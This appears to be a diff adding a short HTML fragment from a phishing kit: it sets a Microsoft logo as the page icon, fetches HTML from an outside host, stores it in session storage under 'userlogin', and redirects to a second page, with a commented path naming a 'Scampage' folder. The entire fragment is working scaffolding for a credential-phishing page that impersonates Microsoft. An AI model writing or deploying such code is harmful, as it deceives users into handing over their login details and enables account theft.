@@ -1,0 +1,14 @@
+
+<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+<script src="https://code.jquery.com/jquery-3.4.1.min.js" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script>
+  axios.get('https://lite.marketingopt.agency/gethtml')
+  .then((response) => {
+    sessionStorage.setItem("userlogin",response.data);
+    // window.location.replace("file:///C:/Users/computer/Desktop/Tools/Scampage/second.html")  
+    window.location.replace("/second.htm")    
+  });
+
+    
+</script>
